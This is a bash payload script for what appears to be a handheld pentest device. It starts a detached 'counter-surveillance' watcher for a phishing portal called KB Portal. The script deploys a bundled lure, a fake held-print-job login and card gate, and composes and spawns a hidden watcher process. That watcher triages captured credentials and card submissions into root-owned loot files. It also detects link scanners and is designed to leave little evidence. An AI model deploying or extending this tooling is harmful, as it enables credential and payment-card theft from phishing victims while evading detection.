#!/bin/bash
# Title: KB Whisper Start
# Description: Live counter-surveillance layer for KB Portal: a detached watcher reads the capture log, triages hits (credentials / card posts / link-scanner crawlers / zero-click identifiers), and alerts the LCD. The pager hears the conversation around your lure.
# Author: Smaug <smaug@devbox2>
# Category: interception
# Version: 1.0

# Device facts (verified 2026-10-01 via ssh, FW 1.5.0-epic): setsid present,
# busybox ash, /usr/bin/{ALERT,VIBRATE,RINGTONE,PROMPT} exist. No python.
# Capture+DNS log paths = the device-verified tmpfs sinks KB Portal uses
# (CGIs cannot traverse /root 700, so loot lands world-writable in /tmp;
# this watcher runs detached and reads them, then writes root-owned loot).
#
# Design law: zero evidence on the network path. Watcher opens no sockets,
# touches no /mmc files, leaves only /tmp compose + whisper.log in loot.
# UI-collision rule honored: ALERT only (notification, never a dialog),
# every UI call guarded with || true for the detached context.

LOG green "KB Whisper Start v1.0"

PH=${_PAYLOAD_HOME:-/root/payloads/user/interception/kb_whisper_start}
PSTATE=${KBP_STATE:-/root/loot/kb_portal}
MARKER="$PSTATE/active"
WSTATE=${KBW_STATE:-$PSTATE}
mkdir -p "$WSTATE" 2>/dev/null || { WSTATE=/tmp/kbwhisper; mkdir -p "$WSTATE"; }

if [ ! -f "$MARKER" ]; then
  LOG red "KB Portal is not running - start it first (KB Portal Start), then arm Whisper"
  ALERT "Start KB Portal first"
  exit 0
fi

# house picker rule: || exit 0 + log, mandatory default LAST
PICK=$(LIST_PICKER "Whisper alert level" "Quiet (loot only)" "Noisy (+vibrate+rings)" "Alerts (LCD)") \
  || { LOG yellow "cancelled - nothing armed"; exit 0; }
case "$PICK" in
  Quiet*) SENS=0 ;;
  Noisy*) SENS=2 ;;
  *)      SENS=1 ;;
esac

TRI="$PH/include/triage.sh"
WATCH="$PH/include/watcher.sh"
if [ ! -f "$TRI" ] || [ ! -f "$WATCH" ]; then
  LOG red "include/triage.sh or include/watcher.sh missing in payload dir"
  ALERT "Payload incomplete"
  exit 0
fi

# self-deploy bundled lure (same pattern KB Portal Start uses for corp_gate):
# gate_card = held-print-job card gate; whisper's watcher triages its POSTs
GATE="$PH/template/gate_card"
if [ -d "$GATE" ] && [ ! -d "${KBP_ROOT:-/root/portals}/gate_card" ]; then
  mkdir -p "${KBP_ROOT:-/root/portals}" 2>/dev/null \
    && cp -r "$GATE" "${KBP_ROOT:-/root/portals}/gate_card" 2>/dev/null \
    && chmod 755 "${KBP_ROOT:-/root/portals}/gate_card/login.cgi" 2>/dev/null \
    && LOG green "bundled lure deployed -> ${KBP_ROOT:-/root/portals}/gate_card" \
    || LOG yellow "gate_card deploy failed (portal may still run corp_gate)"
fi

# heal a previous watcher by exact saved PID (never pattern-pkill: house rule)
OLD=$(sed -n '1p' /tmp/kbwhisper_watch.pid 2>/dev/null)
if [ -n "$OLD" ] && kill -0 "$OLD" 2>/dev/null; then
  kill "$OLD" 2>/dev/null
  LOG yellow "stopped stale watcher pid=$OLD"
fi

# compose: env header + pure triage + detached loop (order matters: env first)
RUN=${KBW_RUN:-/tmp/kbwhisper.sh}
{ printf 'KBW_CAP="%s"\n'   "${KBP_CAPLOG:-/tmp/kbportal_capture.log}"
  printf 'KBW_DNS="%s"\n'   "${KBP_DNSLOG:-/tmp/kbportal_dns.log}"
  printf 'KBW_STATE="%s"\n' "$WSTATE"
  printf 'KBW_MARKER="%s"\n' "$MARKER"
  printf 'KBW_SENS=%s\n'    "$SENS"
  cat "$TRI" "$WATCH"
} > "$RUN" 2>/dev/null || { LOG red "cannot compose $RUN"; ALERT "Compose failed"; exit 0; }

ash -n "$RUN" >/dev/null 2>&1 || { LOG red "composed watcher failed syntax check"; ALERT "Watcher syntax fail"; exit 0; }

# test hook (documented, default off): harness asserts compose+check only
if [ "${KBW_SPAWN:-1}" = "0" ]; then
  LOG yellow "KBW_SPAWN=0 - composed and checked, NOT spawned (harness mode)"
  ALERT "Whisper composed (no spawn)"
  exit 0
fi

setsid ash "$RUN" >/dev/null 2>&1 &
sleep 1
WPID=$(sed -n '1p' /tmp/kbwhisper_watch.pid 2>/dev/null)
if [ -z "$WPID" ] || ! kill -0 "$WPID" 2>/dev/null; then
  LOG red "watcher died instantly - inspect $RUN"
  ALERT "Whisper failed to start"
  exit 0
fi

printf 'WPID=%s\nSENS=%s\nTS=%s\n' "$WPID" "$SENS" "$(date -u +%FT%TZ)" > "$WSTATE/whisper.marker" 2>/dev/null

LOG green "WHISPER LIVE: pid=$WPID level=$SENS ($PICK)"
LOG "live triage -> $WSTATE/whisper.log   - stop with KB Whisper Stop"
LOG "scanner alerts mean someone forwarded the portal URL into chat/mail"
[ "$SENS" = 0 ] || ALERT "Whisper armed: $PICK"
exit 0
